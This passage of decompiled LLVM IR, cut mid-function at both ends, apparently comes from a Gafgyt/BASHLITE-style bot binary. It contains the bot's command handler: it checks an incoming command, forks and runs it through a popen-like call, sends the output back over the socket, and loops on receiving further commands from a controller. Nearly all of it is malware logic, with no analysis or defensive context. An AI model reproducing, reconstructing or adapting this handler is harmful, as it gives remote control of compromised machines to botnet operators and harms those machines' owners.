  %v2_804d40a239 = load i8, i8* %v5_804d33f, align 1
  %v3_804d40a240 = zext i8 %v2_804d40a239 to i32
  %v6_804d40a242 = or i32 %v3_804d40a240, %v1_804d377
  store i32 %v6_804d40a242, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d40c243 = icmp eq i8 %v2_804d40a239, 0
  %v1_804d40e244 = icmp eq i1 %v4_804d40c243, false
  br i1 %v1_804d40e244, label %dec_label_pc_804d3e7, label %dec_label_pc_804d410

dec_label_pc_804d3e7:                             ; preds = %dec_label_pc_804d3d6, %dec_label_pc_804d3e7
  %storemerge15246 = phi i8* [ %storemerge15, %dec_label_pc_804d3e7 ], [ %v5_804d33f, %dec_label_pc_804d3d6 ]
  %storemerge15.in245 = phi i32 [ %v5_804d404, %dec_label_pc_804d3e7 ], [ %v1_804d33c, %dec_label_pc_804d3d6 ]
  store i32 %storemerge15.in245, i32* %eax.global-to-local, align 4
  %v2_804d3ea = load i8, i8* %storemerge15246, align 1
  %v3_804d3ea = zext i8 %v2_804d3ea to i32
  store i32 %v3_804d3ea, i32* %eax.global-to-local, align 4
  %v0_804d3f1 = load i32, i32* @esp, align 4
  %v5_804d3f1 = icmp ult i32 %v0_804d3f1, 12
  store i1 %v5_804d3f1, i1* %cf.global-to-local, align 1
  %v2_804d3f4 = add i32 %v0_804d3f1, -16
  %v3_804d3f4 = inttoptr i32 %v2_804d3f4 to i32*
  store i32 %v3_804d3ea, i32* %v3_804d3f4, align 4
  %v2_804d3f5 = call i32 @__GI_toupper(i32 %storemerge15.in245)
  %v0_804d3fa = load i32, i32* @esp, align 4
  %v2_804d3fa = icmp ugt i32 %v0_804d3fa, -17
  store i1 %v2_804d3fa, i1* %cf.global-to-local, align 1
  %v1_804d3fd = urem i32 %v2_804d3f5, 256
  %v2_804d3fd = load i32, i32* @edx, align 4
  %v3_804d3fd = and i32 %v2_804d3fd, -256
  %v4_804d3fd = or i32 %v3_804d3fd, %v1_804d3fd
  store i32 %v4_804d3fd, i32* @edx, align 4
  %v1_804d402 = trunc i32 %v2_804d3f5 to i8
  store i8 %v1_804d402, i8* %storemerge15246, align 1
  %v5_804d404 = add i32 %storemerge15.in245, 1
  %storemerge15 = inttoptr i32 %v5_804d404 to i8*
  store i32 %v5_804d404, i32* %eax.global-to-local, align 4
  %v2_804d40a = load i8, i8* %storemerge15, align 1
  %v3_804d40a = zext i8 %v2_804d40a to i32
  %v5_804d40a = and i32 %v5_804d404, -256
  %v6_804d40a = or i32 %v3_804d40a, %v5_804d40a
  store i32 %v6_804d40a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d40c = icmp eq i8 %v2_804d40a, 0
  %v1_804d40e = icmp eq i1 %v4_804d40c, false
  br i1 %v1_804d40e, label %dec_label_pc_804d3e7, label %dec_label_pc_804d410

dec_label_pc_804d410:                             ; preds = %dec_label_pc_804d3e7, %dec_label_pc_804d3d6
  %v22_804d3dc = inttoptr i32 %v5_804d3dc to i8*
  store i32 %v1_804d33c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804d33c, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80567b1.184 to i32), i32* @edi, align 4
  %v7_804d440 = call i32 @_strncmp(i8* %v5_804d33f, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80567b1.184, i32 0, i32 0), i32 11)
  %v8_804d440 = urem i32 %v7_804d440, 2
  %v9_804d440 = icmp eq i32 %v8_804d440, 0
  %v0_804d442 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d442 = or i1 %v0_804d442, %v9_804d440
  %v3_804d442 = zext i1 %v2_804d442 to i32
  %v4_804d442 = load i32, i32* @edx, align 4
  %v5_804d442 = and i32 %v4_804d442, -256
  %v6_804d442 = or i32 %v3_804d442, %v5_804d442
  %v7_804d442 = xor i32 %v6_804d442, 1
  store i32 %v7_804d442, i32* @edx, align 4
  %v3_804d448 = and i32 %v7_804d440, -256
  %v1_804d44a = trunc i32 %v7_804d442 to i8
  %v3_804d44a = zext i1 %v0_804d442 to i8
  %v4_804d44a = sub nsw i8 %v1_804d44a, %v3_804d44a
  %v15_804d44a = icmp eq i8 %v4_804d44a, 0
  %v20_804d44a = zext i8 %v4_804d44a to i32
  %v23_804d44a = or i32 %v20_804d44a, %v3_804d448
  store i32 %v23_804d44a, i32* @ecx, align 4
  %v2_804d44e = sext i8 %v4_804d44a to i32
  store i32 %v2_804d44e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d453 = icmp eq i1 %v15_804d44a, false
  br i1 %v1_804d453, label %dec_label_pc_804d549, label %dec_label_pc_804d459

dec_label_pc_804d459:                             ; preds = %dec_label_pc_804d410
  %v0_804d459 = call i32 @listFork()
  store i32 %v0_804d459, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d45e = icmp eq i32 %v0_804d459, 0
  %v1_804d460 = icmp eq i1 %v1_804d45e, false
  br i1 %v1_804d460, label %dec_label_pc_804d673.outer26, label %dec_label_pc_804d466

dec_label_pc_804d466:                             ; preds = %dec_label_pc_804d459
  store i32 %v2_804d466, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804d473 = load i32, i32* @esp, align 4
  %v5_804d473 = icmp ult i32 %v0_804d473, 4
  store i1 %v5_804d473, i1* %cf.global-to-local, align 1
  %v2_804d476 = add i32 %v0_804d473, -8
  %v3_804d476 = inttoptr i32 %v2_804d476 to i32*
  store i32 1024, i32* %v3_804d476, align 4
  %v1_804d477 = add i32 %v0_804d473, -12
  %v2_804d477 = inttoptr i32 %v1_804d477 to i32*
  store i32 0, i32* %v2_804d477, align 4
  %v2_804d479 = add i32 %v0_804d473, -16
  %v3_804d479 = inttoptr i32 %v2_804d479 to i32*
  store i32 %v2_804d466, i32* %v3_804d479, align 4
  %v5_804d47a = call i32 @__GI_memset(i8* inttoptr (i32 11 to i8*), i32 ptrtoint ([11 x i8]* @global_var_80567b1.184 to i32), i32 %v1_804d33c)
  %v0_804d47f = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_80567bc.185 to i32), i32* %eax.global-to-local, align 4
  %tmp278 = and i32 %v0_804d47f, -4
  %v5_804d487 = icmp eq i32 %tmp278, -16
  store i1 %v5_804d487, i1* %cf.global-to-local, align 1
  %v6_804d48a = add i32 %v0_804d47f, 8
  %v7_804d48a = inttoptr i32 %v6_804d48a to i32*
  store i32 %v5_804d3dc, i32* %v7_804d48a, align 4
  %v0_804d48d = load i32, i32* %eax.global-to-local, align 4
  %v2_804d48d = add i32 %v0_804d47f, 4
  %v3_804d48d = inttoptr i32 %v2_804d48d to i32*
  store i32 %v0_804d48d, i32* %v3_804d48d, align 4
  store i32 %v2_804d466, i32* %eax.global-to-local, align 4
  %v3_804d494 = inttoptr i32 %v0_804d47f to i32*
  store i32 %v2_804d466, i32* %v3_804d494, align 4
  %v7_804d495 = call i32 @szprintf(i32 11, i32 ptrtoint ([11 x i8]* @global_var_80567b1.184 to i32), i32 %v1_804d33c, i32 %v1_804d33c, i32 %v1_804d33c, i32 %stack_var_-5832.1)
  %v0_804d49a = load i32, i32* @esp, align 4
  %tmp279 = and i32 %v0_804d49a, -8
  %v5_804d4a2 = icmp eq i32 %tmp279, -16
  store i1 %v5_804d4a2, i1* %cf.global-to-local, align 1
  %v2_804d4a5 = add i32 %v0_804d49a, 4
  %v3_804d4a5 = inttoptr i32 %v2_804d4a5 to i32*
  store i32 ptrtoint (i32* @global_var_8056700.174 to i32), i32* %v3_804d4a5, align 4
  store i32 %v2_804d466, i32* @eax, align 4
  %v3_804d4ac = inttoptr i32 %v0_804d49a to i32*
  store i32 %v2_804d466, i32* %v3_804d4ac, align 4
  %v0_804d4ad = call i32 @fdpopen()
  store i32 %v0_804d4ad, i32* %eax.global-to-local, align 4
  %v3_804d4fe = inttoptr i32 %v0_804d4ad to i8*
  br label %dec_label_pc_804d513

dec_label_pc_804d4ba:                             ; preds = %dec_label_pc_804d513
  store i32 %v2_804d466, i32* %eax.global-to-local, align 4
  %v5_804d4c0 = icmp ult i32 %v1_804d52a, 12
  store i1 %v5_804d4c0, i1* %cf.global-to-local, align 1
  %v3_804d4c3 = inttoptr i32 %v0_804d52a to i32*
  store i32 %v2_804d466, i32* %v3_804d4c3, align 4
  %v0_804d4c4 = call i32 @trim()
  %v0_804d4c9 = load i32, i32* @esp, align 4
  %v0_804d4cc = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804d4cc, i32* %edx.global-to-local, align 4
  %tmp280 = and i32 %v0_804d4c9, -4
  %v5_804d4d2 = icmp eq i32 %tmp280, -16
  store i1 %v5_804d4d2, i1* %cf.global-to-local, align 1
  store i32 %v2_804d466, i32* %eax.global-to-local, align 4
  %v2_804d4db = add i32 %v0_804d4c9, 8
  %v3_804d4db = inttoptr i32 %v2_804d4db to i32*
  store i32 %v2_804d466, i32* %v3_804d4db, align 4
  %v1_804d4dc = add i32 %v0_804d4c9, 4
  %v2_804d4dc = inttoptr i32 %v1_804d4dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80567c4.186 to i32), i32* %v2_804d4dc, align 4
  %v0_804d4e1 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d4e1 = inttoptr i32 %v0_804d4c9 to i32*
  store i32 %v0_804d4e1, i32* %v3_804d4e1, align 4
  %v2_804d4e2 = call i32 @Rootsprintf(i32 %v0_804d4ad, i32 %stack_var_-28.1.ph)
  %v0_804d4e7 = load i32, i32* @esp, align 4
  store i32 %v2_804d466, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp281 = and i32 %v0_804d4e7, -4
  %v5_804d4f7 = icmp eq i32 %tmp281, -16
  store i1 %v5_804d4f7, i1* %cf.global-to-local, align 1
  %v2_804d4fa = add i32 %v0_804d4e7, 8
  %v3_804d4fa = inttoptr i32 %v2_804d4fa to i32*
  store i32 1024, i32* %v3_804d4fa, align 4
  %v1_804d4fb = add i32 %v0_804d4e7, 4
  %v2_804d4fb = inttoptr i32 %v1_804d4fb to i32*
  store i32 0, i32* %v2_804d4fb, align 4
  %v3_804d4fd = inttoptr i32 %v0_804d4e7 to i32*
  store i32 %v2_804d466, i32* %v3_804d4fd, align 4
  %v2_804d4fe = load i32, i32* %stack_var_-24, align 4
  %v4_804d4fe = call i32 @__GI_memset(i8* %v3_804d4fe, i32 %stack_var_-28.1.ph, i32 %v2_804d4fe)
  store i32 %v4_804d4fe, i32* %eax.global-to-local, align 4
  %v0_804d503 = load i32, i32* @esp, align 4
  %v1_804d503 = add i32 %v0_804d503, 16
  %v5_804d506 = icmp ult i32 %v1_804d503, 12
  store i1 %v5_804d506, i1* %cf.global-to-local, align 1
  %v2_804d509 = inttoptr i32 %v0_804d503 to i32*
  store i32 1, i32* %v2_804d509, align 4
  %v0_804d50b = call i32 @sleep()
  store i32 %v0_804d50b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d513

dec_label_pc_804d513:                             ; preds = %dec_label_pc_804d466, %dec_label_pc_804d4ba
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp282 = and i32 %storemerge23.in.in, -4
  %v5_804d513 = icmp eq i32 %tmp282, -16
  store i1 %v5_804d513, i1* %cf.global-to-local, align 1
  %v5_804d516 = add i32 %storemerge23.in.in, 8
  %v6_804d516 = inttoptr i32 %v5_804d516 to i32*
  store i32 %v0_804d4ad, i32* %v6_804d516, align 4
  %v1_804d519 = add i32 %storemerge23.in.in, 4
  %v2_804d519 = inttoptr i32 %v1_804d519 to i32*
  store i32 1024, i32* %v2_804d519, align 4
  store i32 %v2_804d466, i32* %eax.global-to-local, align 4
  %v3_804d524 = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_804d466, i32* %v3_804d524, align 4
  %v2_804d525 = load i32, i32* %stack_var_-24, align 4
  %v3_804d525 = call i32 @fdgets(i32 %v0_804d4ad, i32 %stack_var_-28.1.ph, i32 %v2_804d525)
  store i32 %v3_804d525, i32* %eax.global-to-local, align 4
  %v0_804d52a = load i32, i32* @esp, align 4
  %v1_804d52a = add i32 %v0_804d52a, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d52d = icmp eq i32 %v3_804d525, 0
  %v1_804d52f = icmp eq i1 %v1_804d52d, false
  br i1 %v1_804d52f, label %dec_label_pc_804d4ba, label %dec_label_pc_804d531

dec_label_pc_804d531:                             ; preds = %dec_label_pc_804d513
  %v5_804d531 = icmp ult i32 %v1_804d52a, 12
  store i1 %v5_804d531, i1* %cf.global-to-local, align 1
  %v6_804d534 = inttoptr i32 %v0_804d52a to i32*
  store i32 %v0_804d4ad, i32* %v6_804d534, align 4
  %v0_804d537 = call i32 @fdpclose()
  store i32 %v0_804d537, i32* @eax, align 4
  %v0_804d53c = load i32, i32* @esp, align 4
  %v1_804d53c = add i32 %v0_804d53c, 16
  %v5_804d53f = icmp ult i32 %v1_804d53c, 12
  store i1 %v5_804d53f, i1* %cf.global-to-local, align 1
  %v2_804d542 = inttoptr i32 %v0_804d53c to i32*
  store i32 0, i32* %v2_804d542, align 4
  %v1_804d544 = call i32 @__GI_exit(i32 %v0_804d4ad)
  store i32 %v1_804d544, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d549

dec_label_pc_804d549:                             ; preds = %dec_label_pc_804d410, %dec_label_pc_804d531
  store i32 %v5_804d3dc, i32* @eax, align 4
  %v0_804d553 = load i32, i32* @esp, align 4
  %v5_804d553 = icmp ult i32 %v0_804d553, 8
  store i1 %v5_804d553, i1* %cf.global-to-local, align 1
  %v1_804d556 = add i32 %v0_804d553, -12
  %v2_804d556 = inttoptr i32 %v1_804d556 to i32*
  store i32 ptrtoint (i32* @global_var_80567c7.187 to i32), i32* %v2_804d556, align 4
  %v0_804d55b = load i32, i32* @eax, align 4
  %v2_804d55b = add i32 %v0_804d553, -16
  %v3_804d55b = inttoptr i32 %v2_804d55b to i32*
  store i32 %v0_804d55b, i32* %v3_804d55b, align 4
  %v1_804d55c = load i8*, i8** %stack_var_-36, align 4
  %v2_804d55c = ptrtoint i8* %v1_804d55c to i32
  %v3_804d55c = call i32 @__GI_strtok(i32 1, i32 %v2_804d55c)
  %v0_804d561 = load i32, i32* @esp, align 4
  %v1_804d561 = add i32 %v0_804d561, 16
  %v5_804d564 = inttoptr i32 %v3_804d55c to i8*
  store i8* %v5_804d564, i8** %stack_var_-36, align 4
  store i32 %v1_804d33c, i32* %eax.global-to-local, align 4
  store i32 %v1_804d33c, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d61d65 = icmp eq i32 %v3_804d55c, 0
  %v1_804d62172 = icmp eq i1 %v5_804d61d65, false
  br i1 %v1_804d62172, label %dec_label_pc_804d575, label %dec_label_pc_804d627

dec_label_pc_804d575:                             ; preds = %dec_label_pc_804d549, %dec_label_pc_804d608
  %v0_804d60898 = phi i32 [ %v1_804d617, %dec_label_pc_804d608 ], [ %v1_804d561, %dec_label_pc_804d549 ]
  %v3_804d585 = phi i8* [ %tmp193, %dec_label_pc_804d608 ], [ %v5_804d564, %dec_label_pc_804d549 ]
  %stack_var_-40.173 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804d608 ], [ 1, %dec_label_pc_804d549 ]
  %v4_804d575 = ptrtoint i8* %v3_804d585 to i32
  store i32 %v4_804d575, i32* %eax.global-to-local, align 4
  %v2_804d578 = load i8, i8* %v3_804d585, align 1
  %v3_804d578 = zext i8 %v2_804d578 to i32
  %v5_804d578 = and i32 %v4_804d575, -256
  %v6_804d578 = or i32 %v3_804d578, %v5_804d578
  store i32 %v6_804d578, i32* @eax, align 4
  %v6_804d57a = icmp ult i8 %v2_804d578, 10
  store i1 %v6_804d57a, i1* %cf.global-to-local, align 1
  %v10_804d57a = icmp eq i8 %v2_804d578, 10
  br i1 %v10_804d57a, label %dec_label_pc_804d608, label %dec_label_pc_804d582

dec_label_pc_804d582:                             ; preds = %dec_label_pc_804d575
  store i32 %stack_var_-40.173, i32* @ebx, align 4
  store i32 %v5_804d578, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d575, i32* @edi, align 4
  %v3_804d59c = call i32 @_strlen(i8* %v3_804d585)
  %v1_804d5a0 = add i32 %v3_804d59c, 1
  store i32 %v1_804d5a0, i32* %eax.global-to-local, align 4
  %v0_804d5a4 = load i32, i32* @esp, align 4
  %v5_804d5a4 = icmp ult i32 %v0_804d5a4, 12
  store i1 %v5_804d5a4, i1* %cf.global-to-local, align 1
  %v2_804d5a7 = add i32 %v0_804d5a4, -16
  %v3_804d5a7 = inttoptr i32 %v2_804d5a7 to i32*
  store i32 %v1_804d5a0, i32* %v3_804d5a7, align 4
  %v2_804d5a8 = call i32 @malloc(i32 %v4_804d575)
  %v0_804d5ad = load i32, i32* @esp, align 4
  %v2_804d5ad = icmp ugt i32 %v0_804d5ad, -17
  store i1 %v2_804d5ad, i1* %cf.global-to-local, align 1
  %v1_804d5b0 = load i32, i32* @ebp, align 4
  %v2_804d5b0 = load i32, i32* @ebx, align 4
  %v3_804d5b0 = mul i32 %v2_804d5b0, 4
  %v4_804d5b0 = add i32 %v1_804d5b0, -616
  %v5_804d5b0 = add i32 %v4_804d5b0, %v3_804d5b0
  %v6_804d5b0 = inttoptr i32 %v5_804d5b0 to i32*
  store i32 %v2_804d5a8, i32* %v6_804d5b0, align 4
  %v3_804d5b7 = load i8*, i8** %stack_var_-36, align 4
  %v4_804d5b7 = ptrtoint i8* %v3_804d5b7 to i32
  %v1_804d5c5 = and i32 %v4_804d5b7, -256
  store i32 %v1_804d5c5, i32* %eax.global-to-local, align 4
  %v3_804d5ce = call i32 @_strlen(i8* %v3_804d5b7)
  %v1_804d5d2 = add i32 %v3_804d5ce, 1
  store i32 %v1_804d5d2, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d5db = load i32, i32* @ebp, align 4
  %v2_804d5db = mul i32 %stack_var_-40.173, 4
  %v3_804d5db = add i32 %v2_804d5db, -616
  %v4_804d5db = add i32 %v0_804d5db, %v3_804d5db
  %v5_804d5db = inttoptr i32 %v4_804d5db to i32*
  %v6_804d5db = load i32, i32* %v5_804d5db, align 4
  %v1_804d5e2 = inttoptr i32 %v6_804d5db to i8*
  store i32 %v6_804d5db, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804d5e7 = and i32 %v6_804d5db, -256
  store i32 %v1_804d5e7, i32* %eax.global-to-local, align 4
  %v5_804d5e9 = call i8* @_memset(i8* %v1_804d5e2, i32 %v1_804d5e7, i32 %v1_804d5d2)
  %v6_804d5e9 = ptrtoint i8* %v5_804d5e9 to i32
  store i32 %v6_804d5e9, i32* @ecx, align 4
  store i32 %v4_804d5b7, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d5f1 = load i32, i32* @ebp, align 4
  %v4_804d5f1 = add i32 %v0_804d5f1, %v3_804d5db
  %v5_804d5f1 = inttoptr i32 %v4_804d5f1 to i32*
  %v6_804d5f1 = load i32, i32* %v5_804d5f1, align 4
  store i32 %v6_804d5f1, i32* @eax, align 4
  %v0_804d5f8 = load i32, i32* @esp, align 4
  %v5_804d5f8 = icmp ult i32 %v0_804d5f8, 8
  store i1 %v5_804d5f8, i1* %cf.global-to-local, align 1
  %v2_804d5fb = add i32 %v0_804d5f8, -12
  %v3_804d5fb = inttoptr i32 %v2_804d5fb to i32*
  store i32 %v4_804d5b7, i32* %v3_804d5fb, align 4
  %v0_804d5fc = load i32, i32* @eax, align 4
  %v2_804d5fc = add i32 %v0_804d5f8, -16
  %v3_804d5fc = inttoptr i32 %v2_804d5fc to i32*
  store i32 %v0_804d5fc, i32* %v3_804d5fc, align 4
  %v5_804d5fd = call i32 @strcpy(i8* %v3_804d5b7, i32 %v4_804d575)
  store i32 %v5_804d5fd, i32* @eax, align 4
  %v0_804d602 = load i32, i32* @esp, align 4
  %v1_804d602 = add i32 %v0_804d602, 16
  %v2_804d602 = icmp ugt i32 %v0_804d602, -17
  store i1 %v2_804d602, i1* %cf.global-to-local, align 1
  %v4_804d605 = add i32 %stack_var_-40.173, 1
  br label %dec_label_pc_804d608

dec_label_pc_804d608:                             ; preds = %dec_label_pc_804d575, %dec_label_pc_804d582
  %v0_804d608 = phi i32 [ %v0_804d60898, %dec_label_pc_804d575 ], [ %v1_804d602, %dec_label_pc_804d582 ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.173, %dec_label_pc_804d575 ], [ %v4_804d605, %dec_label_pc_804d582 ]
  %v5_804d608 = icmp ult i32 %v0_804d608, 8
  store i1 %v5_804d608, i1* %cf.global-to-local, align 1
  %v1_804d60b = add i32 %v0_804d608, -12
  %v2_804d60b = inttoptr i32 %v1_804d60b to i32*
  store i32 ptrtoint (i32* @global_var_80567c7.187 to i32), i32* %v2_804d60b, align 4
  %v1_804d610 = add i32 %v0_804d608, -16
  %v2_804d610 = inttoptr i32 %v1_804d610 to i32*
  store i32 0, i32* %v2_804d610, align 4
  %v1_804d612 = load i8*, i8** %stack_var_-36, align 4
  %v2_804d612 = ptrtoint i8* %v1_804d612 to i32
  %v3_804d612 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_804d612)
  store i32 %v3_804d612, i32* %eax.global-to-local, align 4
  %v0_804d617 = load i32, i32* @esp, align 4
  %v1_804d617 = add i32 %v0_804d617, 16
  store i32 %v3_804d612, i32* %tmp191, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d61d = icmp eq i32 %v3_804d612, 0
  %v1_804d621 = icmp eq i1 %v5_804d61d, false
  %tmp193 = inttoptr i32 %v3_804d612 to i8*
  br i1 %v1_804d621, label %dec_label_pc_804d575, label %dec_label_pc_804d627

dec_label_pc_804d627:                             ; preds = %dec_label_pc_804d608, %dec_label_pc_804d549
  %v0_804d627 = phi i32 [ %v1_804d561, %dec_label_pc_804d549 ], [ %v1_804d617, %dec_label_pc_804d608 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804d549 ], [ %stack_var_-40.0, %dec_label_pc_804d608 ]
  %v5_804d627 = icmp ult i32 %v0_804d627, 8
  store i1 %v5_804d627, i1* %cf.global-to-local, align 1
  store i32 %v2_804d62a, i32* %eax.global-to-local, align 4
  %v2_804d630 = add i32 %v0_804d627, -12
  %v3_804d630 = inttoptr i32 %v2_804d630 to i32*
  store i32 %v2_804d62a, i32* %v3_804d630, align 4
  %v5_804d631 = add i32 %v0_804d627, -16
  %v6_804d631 = inttoptr i32 %v5_804d631 to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_804d631, align 4
  %v0_804d634 = call i32 @processCmd()
  store i32 %v0_804d634, i32* %eax.global-to-local, align 4
  %v0_804d639 = load i32, i32* @esp, align 4
  %v9_804d63c = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804d63c, i1* %cf.global-to-local, align 1
  %v7_804d640 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804d640, label %dec_label_pc_804d652.lr.ph, label %dec_label_pc_804d673.outer26

dec_label_pc_804d652.lr.ph:                       ; preds = %dec_label_pc_804d627
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d652

dec_label_pc_804d652:                             ; preds = %dec_label_pc_804d652.lr.ph, %dec_label_pc_804d652
  %storemerge251 = phi i32 [ 1, %dec_label_pc_804d652.lr.ph ], [ %v4_804d668, %dec_label_pc_804d652 ]
  %v0_804d65c250.in = phi i32 [ %v0_804d639, %dec_label_pc_804d652.lr.ph ], [ %v0_804d665, %dec_label_pc_804d652 ]
  %v0_804d65c250 = add i32 %v0_804d65c250.in, 16
  store i32 %storemerge251, i32* %eax.global-to-local, align 4
  %v0_804d655 = load i32, i32* @ebp, align 4
  %v2_804d655 = mul i32 %storemerge251, 4
  %v3_804d655 = add i32 %v2_804d655, -616
  %v4_804d655 = add i32 %v3_804d655, %v0_804d655
  %v5_804d655 = inttoptr i32 %v4_804d655 to i32*
  %v6_804d655 = load i32, i32* %v5_804d655, align 4
  store i32 %v6_804d655, i32* %eax.global-to-local, align 4
  %v5_804d65c = icmp ult i32 %v0_804d65c250, 12
  store i1 %v5_804d65c, i1* %cf.global-to-local, align 1
  %v3_804d65f = inttoptr i32 %v0_804d65c250.in to i32*
  store i32 %v6_804d655, i32* %v3_804d65f, align 4
  %v1_804d660 = call i32 @free(i32 %storemerge251)
  %v0_804d665 = load i32, i32* @esp, align 4
  %v4_804d668 = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804d668, i32* %eax.global-to-local, align 4
  %v10_804d66e = icmp ult i32 %v4_804d668, %stack_var_-40.1.lcssa
  store i1 %v10_804d66e, i1* %cf.global-to-local, align 1
  %v5_804d671 = icmp slt i32 %v4_804d668, %stack_var_-40.1.lcssa
  br i1 %v5_804d671, label %dec_label_pc_804d652, label %dec_label_pc_804d673.outer

dec_label_pc_804d673.outer:                       ; preds = %dec_label_pc_804d652, %dec_label_pc_804cfd3
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804cfd3 ], [ %v4_804d668, %dec_label_pc_804d652 ]
  %stack_var_-5832.2.ph = phi i32 [ %stack_var_-5832.0.ph, %dec_label_pc_804cfd3 ], [ %stack_var_-5832.1, %dec_label_pc_804d652 ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_804cfd3 ], [ %v22_804d3dc, %dec_label_pc_804d652 ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph36, %dec_label_pc_804cfd3 ], [ %stack_var_-60.2, %dec_label_pc_804d652 ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph37, %dec_label_pc_804cfd3 ], [ %stack_var_-96.1, %dec_label_pc_804d652 ]
  br label %dec_label_pc_804d673.outer26

dec_label_pc_804d673.outer26:                     ; preds = %dec_label_pc_804d459, %dec_label_pc_804d627, %dec_label_pc_804d673.outer
  %stack_var_-5832.2.ph27 = phi i32 [ %stack_var_-5832.2.ph, %dec_label_pc_804d673.outer ], [ %stack_var_-5832.1, %dec_label_pc_804d627 ], [ %stack_var_-5832.1, %dec_label_pc_804d459 ]
  %stack_var_-64.2.ph28 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_804d673.outer ], [ %v22_804d3dc, %dec_label_pc_804d627 ], [ %v22_804d3dc, %dec_label_pc_804d459 ]
  %stack_var_-60.3.ph29 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_804d673.outer ], [ %stack_var_-60.2, %dec_label_pc_804d627 ], [ %stack_var_-60.2, %dec_label_pc_804d459 ]
  %stack_var_-96.2.ph30 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d673.outer ], [ %stack_var_-96.1, %dec_label_pc_804d627 ], [ %stack_var_-96.1, %dec_label_pc_804d459 ]
  br label %dec_label_pc_804d673.outer31

dec_label_pc_804d673.outer31:                     ; preds = %dec_label_pc_804d301, %dec_label_pc_804d2cd, %dec_label_pc_804d673.outer26
  %stack_var_-64.2.ph32 = phi i8* [ %stack_var_-64.2.ph28, %dec_label_pc_804d673.outer26 ], [ %tmp190, %dec_label_pc_804d2cd ], [ %tmp190, %dec_label_pc_804d301 ]
  %stack_var_-60.3.ph33 = phi i32 [ %stack_var_-60.3.ph29, %dec_label_pc_804d673.outer26 ], [ %stack_var_-60.2, %dec_label_pc_804d2cd ], [ %stack_var_-60.2, %dec_label_pc_804d301 ]
  %stack_var_-96.2.ph34 = phi i32 [ %stack_var_-96.2.ph30, %dec_label_pc_804d673.outer26 ], [ %stack_var_-96.1, %dec_label_pc_804d2cd ], [ %stack_var_-96.1, %dec_label_pc_804d301 ]
  %v2_804d03a = ptrtoint i8* %stack_var_-64.2.ph32 to i32
  %v0_804d67f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d673

dec_label_pc_804d673:                             ; preds = %dec_label_pc_804d673.outer31, %dec_label_pc_804d267
  %v0_804d67f = phi i32 [ %v1_804d27a, %dec_label_pc_804d267 ], [ %v0_804d67f.pre, %dec_label_pc_804d673.outer31 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_804d267 ], [ %stack_var_-60.3.ph33, %dec_label_pc_804d673.outer31 ]
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v0_804d679 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804d679, i32* %edx.global-to-local, align 4
  %v5_804d67f = icmp ult i32 %v0_804d67f, 4
  store i1 %v5_804d67f, i1* %cf.global-to-local, align 1
  %v1_804d682 = add i32 %v0_804d67f, -8
  %v2_804d682 = inttoptr i32 %v1_804d682 to i32*
  store i32 4096, i32* %v2_804d682, align 4
  %v2_804d687 = add i32 %v0_804d67f, -12
  %v3_804d687 = inttoptr i32 %v2_804d687 to i32*
  store i32 %v2_804d673, i32* %v3_804d687, align 4
  %v0_804d688 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d688 = add i32 %v0_804d67f, -16
  %v3_804d688 = inttoptr i32 %v2_804d688 to i32*
  store i32 %v0_804d688, i32* %v3_804d688, align 4
  %v0_804d689 = call i32 @recvLine()
  store i32 %v0_804d689, i32* %eax.global-to-local, align 4
  %v0_804d68e = load i32, i32* @esp, align 4
  %v8_804d694 = icmp ne i32 %v0_804d689, -1
